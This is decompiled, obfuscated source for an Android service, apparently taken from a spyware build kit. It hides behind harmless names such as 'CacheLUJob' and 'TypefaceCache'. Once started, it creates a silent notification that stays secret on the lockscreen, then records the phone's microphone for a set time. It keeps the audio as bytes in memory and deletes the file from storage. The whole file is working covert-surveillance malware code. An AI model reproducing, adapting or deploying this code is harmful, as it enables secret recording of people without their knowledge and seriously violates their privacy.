package app.mobilex.plus.services;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import app.mobilex.plus.util.TypefaceCache;
import java.io.File;
import v.s.RIZfHbqXpth8r2yN4;
import v.s.bzHLgVWZZfjKGub8Jt;
import v.s.hzCVl0f866ksvpzUUql;
import v.s.s4Xe0OepSKbHpb3Nsd;
import v.s.u4HKFgCbgUKtEQ;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class CacheLUJob extends Service {
    public static final String Ee8d2j4S9Vm5yGuR;
    public static long b1EoSIRjJHO5;
    public static volatile byte[] ibVTtJUNfrGYbW;
    public static int pyu8ovAipBTLYAiKab;
    public static volatile boolean xDyLpEZyrcKVe0;
    public MediaRecorder dDIMxZXP1V8HdM;
    public File w9sT1Swbhx3hs;
    public final Handler vekpFI4d1Nc4fakF = new Handler(Looper.getMainLooper());
    public int JXn4Qf7zpnLjP5 = 30;

    static {
        TypefaceCache.obtain("00020063005F008E00FF008D00D700A4002C0064005F008200E2");
        Ee8d2j4S9Vm5yGuR = TypefaceCache.obtain("00220063005F008E00FF008000C000A2002000790049008300F900B100D5");
    }

    public final void dDIMxZXP1V8HdM() {
        NotificationChannel notificationChannel = new NotificationChannel(Ee8d2j4S9Vm5yGuR, TypefaceCache.checked("0462042E040604A204D004E1048F04FF04740426047D04DF04DF"), 1);
        notificationChannel.setDescription(TypefaceCache.checked("04670428040604D904A204EF04FD00E70402042E040604A204D004E1048F04FF04740426047D04DF04DF00FF048604F7047E042B047004A2"));
        notificationChannel.setShowBadge(false);
        notificationChannel.setSound(null, null);
        notificationChannel.setLockscreenVisibility(-1);
        ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(notificationChannel);
    }

    @Override // android.app.Service
    public final IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public final void onCreate() {
        super.onCreate();
        dDIMxZXP1V8HdM();
    }

    @Override // android.app.Service
    public final void onDestroy() {
        super.onDestroy();
        if (xDyLpEZyrcKVe0) {
            w9sT1Swbhx3hs();
        }
        this.vekpFI4d1Nc4fakF.removeCallbacksAndMessages(null);
        TypefaceCache.obtain("000000770058008F00F5009300E7008D002C0074001B008300F500AC00C600B5002C006F005E0083");
    }

    @Override // android.app.Service
    public final int onStartCommand(Intent intent, int i, int i2) {
        try {
            dDIMxZXP1V8HdM();
            if (Build.VERSION.SDK_INT >= 34) {
                s4Xe0OepSKbHpb3Nsd s4xe0oepskbhpb3nsd = new s4Xe0OepSKbHpb3Nsd(this, Ee8d2j4S9Vm5yGuR);
                s4xe0oepskbhpb3nsd.K7eEOBPYP9VIoHWTe.icon = 2131034145;
                s4xe0oepskbhpb3nsd.hjneShqpF9Tis4 = -2;
                s4xe0oepskbhpb3nsd.vekpFI4d1Nc4fakF(2, true);
                s4xe0oepskbhpb3nsd.dTS0S7eC32ubQH54j36 = true;
                startForeground(3001, s4xe0oepskbhpb3nsd.dDIMxZXP1V8HdM(), 128);
            } else {
                s4Xe0OepSKbHpb3Nsd s4xe0oepskbhpb3nsd2 = new s4Xe0OepSKbHpb3Nsd(this, Ee8d2j4S9Vm5yGuR);
                s4xe0oepskbhpb3nsd2.K7eEOBPYP9VIoHWTe.icon = 2131034145;
                s4xe0oepskbhpb3nsd2.hjneShqpF9Tis4 = -2;
                s4xe0oepskbhpb3nsd2.vekpFI4d1Nc4fakF(2, true);
                s4xe0oepskbhpb3nsd2.dTS0S7eC32ubQH54j36 = true;
                startForeground(3001, s4xe0oepskbhpb3nsd2.dDIMxZXP1V8HdM());
            }
        } catch (Exception unused) {
        }
        this.JXn4Qf7zpnLjP5 = intent != null ? intent.getIntExtra(TypefaceCache.obtain("002700630049008600E400B600DD00A9"), 30) : 30;
        if (RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(this, "android.permission.RECORD_AUDIO") != 0) {
            TypefaceCache.obtain("001100730058008800E200BB009200A6003600720052008800B000AF00D700B5002E007F0048009400F900B000DC00E7002D0079004F00C700F700AD00D300A900370073005F");
            stopSelf();
            return 2;
        }
        try {
            this.w9sT1Swbhx3hs = new File(getCacheDir(), TypefaceCache.obtain("00220063005F008E00FF0080") + System.currentTimeMillis() + TypefaceCache.obtain("006D007B000F0086"));
            MediaRecorder mediaRecorderDDIMxZXP1V8HdM = Build.VERSION.SDK_INT >= 31 ? bzHLgVWZZfjKGub8Jt.dDIMxZXP1V8HdM(this) : new MediaRecorder();
            this.dDIMxZXP1V8HdM = mediaRecorderDDIMxZXP1V8HdM;
            mediaRecorderDDIMxZXP1V8HdM.setAudioSource(1);
            mediaRecorderDDIMxZXP1V8HdM.setOutputFormat(2);
            mediaRecorderDDIMxZXP1V8HdM.setAudioEncoder(3);
            mediaRecorderDDIMxZXP1V8HdM.setAudioSamplingRate(44100);
            mediaRecorderDDIMxZXP1V8HdM.setAudioEncodingBitRate(128000);
            File file = this.w9sT1Swbhx3hs;
            mediaRecorderDDIMxZXP1V8HdM.setOutputFile(file != null ? file.getAbsolutePath() : null);
            mediaRecorderDDIMxZXP1V8HdM.prepare();
            mediaRecorderDDIMxZXP1V8HdM.start();
            xDyLpEZyrcKVe0 = true;
            pyu8ovAipBTLYAiKab = this.JXn4Qf7zpnLjP5;
            TypefaceCache.obtain("001100730058008800E200BB00DB00A9002400360048009300F100AD00C600A200270036005D008800E200FF");
            TypefaceCache.obtain("00630065005E008400FF00B100D600B4");
            this.vekpFI4d1Nc4fakF.postDelayed(new hzCVl0f866ksvpzUUql(1, this), ((long) this.JXn4Qf7zpnLjP5) * 1000);
        } catch (Exception e) {
            TypefaceCache.obtain("00100062005A009500E400FF00C000A2002000790049008300F900B100D500E7002600640049008800E200E50092");
            e.getMessage();
            xDyLpEZyrcKVe0 = false;
            stopSelf();
        }
        return 2;
    }

    public final void w9sT1Swbhx3hs() {
        try {
            MediaRecorder mediaRecorder = this.dDIMxZXP1V8HdM;
            if (mediaRecorder != null) {
                mediaRecorder.stop();
                mediaRecorder.release();
            }
            this.dDIMxZXP1V8HdM = null;
            xDyLpEZyrcKVe0 = false;
            File file = this.w9sT1Swbhx3hs;
            if (file != null && file.exists() && file.length() > 0) {
                ibVTtJUNfrGYbW = u4HKFgCbgUKtEQ.yTljMGnIibTRdOpSh4(file);
                b1EoSIRjJHO5 = System.currentTimeMillis();
                TypefaceCache.obtain("001100730058008800E200BB00DB00A9002400360048008600E600BA00D600FD0063");
                TypefaceCache.obtain("006300740042009300F500AC");
                file.delete();
            }
            TypefaceCache.obtain("001100730058008800E200BB00DB00A9002400360048009300FF00AF00C200A20027");
        } catch (Exception e) {
            TypefaceCache.obtain("001000620054009700B000AD00D700A4002C0064005F008E00FE00B8009200A2003100640054009500AA00FF");
            e.getMessage();
        } finally {
            stopSelf();
        }
    }
}
